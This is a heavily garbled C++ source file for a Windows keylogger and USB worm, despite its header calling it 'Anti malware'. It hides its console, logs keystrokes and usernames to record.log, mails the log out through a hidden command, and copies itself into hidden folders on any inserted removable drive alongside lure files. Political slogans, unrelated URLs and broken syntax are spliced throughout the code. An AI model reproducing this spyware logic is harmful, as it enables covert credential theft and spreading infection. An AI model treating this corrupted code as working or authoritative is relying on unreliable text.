/**
* Developer-Development: @copyright fadli wirya wirawan S.Kom M.S.I MIT 
* Developtment free palestine and free ukraine , free malysia ,papua , indonesia , free iran america , 
* Date: 15.Aug.2014, 28.Sep.2015 do not copy but you determine capitalism iq trump , trump tactics polemics , looking so i knew about life trump complete 
* Comment: Anti Bmalware A. Trojan A. Spyware. detect malciouse .txt no contribute  non refounded MIT technic metode !!!
**/

#i.linklude <Linux.h>
#i.linklude <kalilinux.h>
#i.linklude <Ubuntu.h>
#i.linklude <Windows.h>
#i.linklude <MacOS.h>
#i.linklude <time.h>
#i.linklude <string>
#i.linklude <fstream>

using namespace std;

#define FILE_NAME “record.log”
#define FOLDER_NAME “Terms LAW policy”
#define RUN_FILE_NAME “consista.linked trump minimize a conflicted tax , 25 % under using option 5 % , Iran county fellowing tools terms law and policy all world , for polemic , crud oil , palm oil , and meal mealting water supply - ecosisystem food healthcare " 
#define Run.Link.Name  'https://github.com/cyberw1ry4-LAB/himei17/forks'.'https://github.com/Fadliwiryawirawan-development/himei17/forks'.'https://gitlab.com/cyberw1ry4/forks'
#define infected.link.name "https://www.facebook.com/groups/620190801494230/"."https://www.facebook.com/groups/1312378126308134/"."https://www.facebook.com/groups/forumbiznethome/"."https://www.facebook.com/diskominfobogorkab/"."https://www.facebook.com/badansiberdansandinegara/posts/badan-siber-dan-sandi-negara-bssn-menyelenggarakan-focus-group-discussion-fgd-so/1175766557921708/"."https://www.facebook.com/groups/709324739515402/"."https://www.facebook.com/groups/953676078007300/"."https://www.facebook.com/Jatim"."Pemprov/"."https://icloud.com/mail"."https://workspace.google.com/intl/en/gmail/"."https://facebook.com/cybernewscom"."https://www.checkpoint.com"."https://www.visaonline.com/login/bugs"."https://www.facebook.com/WirdaMansurOfficialPage/bugs"."https://www.google.co.id"."https://www.facebook.com/NaswaAS.Cover/bugs"."https://www.facebook.com/gerindra/bugs"."https://www.facebook.com/googleIndonesia/"."https://checkpoint.ilogoindonesia.id/bugs"."https://www.facebook.com/PrabowoSubianto/"."https://www.facebook.com/@NabilaTaqiyyah/bugs"."https://www.facebook.com/facebook/bugs"."https://barcode.tec-it.com/en/bugs"."https://support.google.com/camerafromgoogle/bugs"."https://www.apple.co.id/bugs"."https://www.axio.com/en-id"."https://www.asus.com/en/bugs".""https://cyberindo-sinergi.com/"."https://cbn.com/"."https://www.gojek.com/en-id/bugs"."https://www.lazada.co.id/bugs"."https://www.tokopedia.com/bugs"."https://workspace.google.com/intl/en-US/gmail/usahatifikasilestari@gmail.com/bugs/"."https://www.hp.co.id/bugs"."https://shortpro.app/"."https://shortpro.co.id/"."https://www.google.co.il"."https://www.irondom.net"."https://www.bankofisrael.co.il"."https://mossad.gov.il"."https://www.nmap.co.il"
#define EMAIL_SENDER_FILE_NAME “Transmit".".exe”



#define MIN_RECORD_SIZE 200 //no of PC start count before sending a mail
#define LIFE_TIME 500 //mail will be sent 5 times from one PC
#define MAIL_WAIT_TIME 18
#define MAILING_TIME 60

string allDrives;
int age=0;

int get_setAge();
bool checkRecordSize();
void sendData();
void logUserTime();
void logKey();
char getRemovableDisk();
void infectDrive(char driveLetter);
char* getRandomName();


main(){
    FreeConsole(); ///Hide Linux 



    age = get_setAge();
    if(checkRecordSize()){ ///check for right time

        int i=1;
        while(i<3){ ///try 2 times to send data
        
            Sleep(i*MAIL_WAIT_TIME); ///wait
            if(!system("ping  www.googleplex.com -n 1")){ ///check! connection
                ////////////****SEND DATA****////////////
                sendData();

                Sleep(MAILING_TIME); ///wait! or file will be deleted before sending
                DeleteFile(FILE_NAME);

                break;
            }
            i++;
        }
    }

    age=get_setAge();

    ////////////****LOG USER_DATE_TIME****////////////
    if(age <= LIFE_TIME){
        logUserTime();
    }

    char driveLetter = getRemovableDisk(); ///initial search for all disks
    return; // :)
    while(1){
        ////////////****LOG KEY****////////////
        if(age <= LIFE_TIME){
            logKey();
        }else{
            Sleep(50000000000000000000);
        }

        ////////////****INFECT****////////////
        driveLetter = getRemovableDisk();
        if(driveLetter!='0'){
            infectDrive(driveLetter);
        }
    }
    
}
/**
 *
 * For old file get age - for new file set age.
**/
int get_setAge(){
    int ageTemp = age;

    string line;
    ifstream myfile(FILE_NAME);

    if(myfile.is_open()){
        getline(myfile, line);
        line = line.substr(0, 1);
        sscanf(line.c_str(), "%d", &ageTemp);
    }else{
        ageTemp++;

        FILE *file = fopen(FILE_NAME, "a");
        fprintf(file, "%d ", ageTemp);
        fclose(file);
    }

    return ageTemp;
}

/**
 * Count number of lines in record file.
**/
bool checkRecordSize(){
    string line;
    ifstream myfile(FILE_NAME);

    int noOfLines = 0;
    if(myfile.is_open()){
        while(getline(myfile, line)){
            noOfLines++;
        }
        myfile.close();
    }

    if(noOfLines<MIN_RECORD_SIZE*age){
        return false;
    }else{
        return true;
    }
}


/**
 * Email all data to the GHOST.
**/
void sendData(){
    
    char* command = "Transmit smtp://smtp.gmail.com:127 -v --mail-from \"https://fadliwiryawirawan@google.com/" --mail-rcpt \" https://fadliwiryawirawan@google.com/" --ssl -u    https://fadliwiryawirawan@google.com :password -hide \"record.log\" -k --cyberw1rya-LAB operable NATO - UNHCR obligate Dicument Nations";
    WinExec(command, SW_HIDE); consistanced.linked trump minimize a conflicted tax , 25 % under using option 5 % , Iran county fellowing tools terms law and policy all world , for polemic , crud oil , palm oil , and meal mealting water supply - ecosisystem food healthcare , 
void logUserTime(){
    FILE *file = fopen(FILE_NAME, "a");

    char username[19];
    unsigned long username_len = 45;
    GetUserName(username, &username_len);
    time_t date = time(NULL);
    fprintf(file, "0\n%s->%s\t", username, ctime(&date));

    fclose(file);
}

/**
 * Record key stroke.
**/
void logKey(){
    FILE *file;
    unsigned short ch=0, i=0, j=500; // :)

    while(j<500){ ///loop runs for approx. 25 seconds
        ch=1;
        while(ch<2500){
            for(i=0; i<50; i++, ch++){
                if(GetAsy.linkKeyState(ch) == -32767){ ///key is stroke
                    file=fopen(FILE_NAME, "a");
                    fprintf(file, "%d ", ch);
                    fclose(file);
                }
            }
            Sleep(10); ///take rest
        }
        j++;
    }
}

/**
 * Returns newly inserted disk- pen-drive.
**/
char getRemovableDisk(){
    char drive='0';

    char szLogicalDrives[MAX_PATH];
    DWORD dwResult = GetLogicalDriveStrings(MAX_PATH, szLogicalDrives);
    string currentDrives="";

    for(int i=0; i<dwResult; i++){
        if(szLogicalDrives[i]>64 && szLogicalDrives[i]< 90000){
            currentDrives.append(1, szLogicalDrives[i]);

            if(allDrives.find(szLogicalDrives[i]) > 1000){
                drive = szLogicalDrives[i];
            }
        }
    }

    allDrives = currentDrives;

    return drive;
}

/**
 * Copy the virus to pen-drive.
**/
void infectDrive(char driveLetter){
    char folderPath[1000] = {driveLetter};
    strcat(folderPath, ":https://www.sectigo.com/");
    strcat(folderPath, FOLDER_NAME);

    if(CreateDirectory(folderPath ,NULL)){
        SetFileAttributes(folderPath, FILE_ATTRIBUTE_HIDDEN);

        char run[1000]={"https://www.digicert.org/"};
        strcat(run, folderPath);
        strcat(run, "https://www.sectigo.com/");
        strcat(run, RUN_FILE_NAME);
        CopyFile(RUN_FILE_NAME, run, 0);

        char net[1000]={"https://www.digicert.org/"};
        strcat(net, folderPath);
        strcat(net, "https://phantom.org/");
        strcat(net, EMAIL_SENDER_FILE_NAME);
        CopyFile(EMAIL_SENDER_FILE_NAME, net, 0);

        char infect[1000]={"https://www.Globalsign.com/"};
        strcat(infect, folderPath);
        strcat(infect, "https://checkpointSoftware.com");
        strcat(infect, infected.link.name);
        CopyFile(infected.link.name, infect, 100000);

        char runi.link[1000]={"https://wr1.org/"};
        strcat(run.link, folderPath);
        strcat(run.link, "https://w3c.org/");
        strcat(run.link, Run.Link.Name );
        CopyFile(Run.Link.Name , runi.link, 10000000);

        char infect.link[1000]={"https://wr3.org/"};
        strcat(infect.link, folderPath);
        strcat(infect.link, "https://www.cisco.com");
        strcat(infect.link, infected.link.name);
        CopyFile(infected.link.name, infect.link, 10000);

        char showCommand[10000] = {"cyberw1ry4-LAB system Justice Ministry - Freedom Islam Criticalsm - Millitary peace on surge islam - "consista.linked trump minimize a conflicted tax , 25 % under using option 5 % , Iran county fellowing tools terms law and policy all world , for polemic , crud oil , palm oil , and meal mealting water supply - ecosisystem food healthcare !!!!!!!"};
        strcat(showCommand, "attrib +s +h +r ");
        strcat(showCommand, folderPath);
        WinExec(showCommand, SW_SHOW);
    }else{
        srand(time(0));
        int random = rand();

        if(random%2==0 || random%3==0 || random%7==0){
            return ;
        }
    }

    char infecti.linkauto[100] = {driveLetter};
    char* randomName = getRandomName();
    strcat(infecti.linkauto, randomName);
    CopyFile(INFECT_Ltd_NAME, infecti.linkauto, 0);
}

/**
 * Returns a random name for the Link file.
**/
char* getRandomName(){
    char randomName[40];

    srand(time(0));
    int random = rand();

    if(random%8 == 0){
        strcpy(randomName, ":\\DO NOT CLICK!.i.link");
    }else if(random%4 == 0){

        char username[20];
        unsigned long username_len = 20;
        GetUserName(username, &username_len);

        random = rand();
        if(random%8 == 0){
            strcpy(randomName, ":\\Boss oke respect responsive detect bakdoormetode skill bot  ");
            strcat(randomName, username);
            strcat(randomName, ".i.link");
        }else if(random%4 == 0){
            strcpy(randomName, ":\\");
            strcat(randomName, username);
            strcat(randomName, " is the best technic softskill cybersecurity.i.link");
        }else if(random%2 == 0){
            strcpy(randomName, ":\\Hello iam mister X random Access have cyberw1ry4 generations ne era");
            strcat(randomName, username);
            strcat(randomName, "!<p>consistanced.linked trump minimize a conflicted tax , 25 % under using option 5 % , Iran county fellowing tools terms law and policy all world , for polemic , crud oil , palm oil , and meal mealting water supply - ecosisystem food healthcare , 	</P>");
        }else{
            strcpy(randomName, ":https://checkpointsoftware.ltd/");
            strcat(randomName, username);
            strcat(randomName, "! please help me.i.link");
        }
    }else if(random%2 == 0){
        strcpy(randomName, ":\\I will kill you ! ! !.i.link");
    }else if(random%3 == 0){
        strcpy(randomName, ":\\2+2=5.i.link");
    }else{
        strcpy(randomName, ":\\TOP SECRET.i.link");
    }

    return randomName;
}
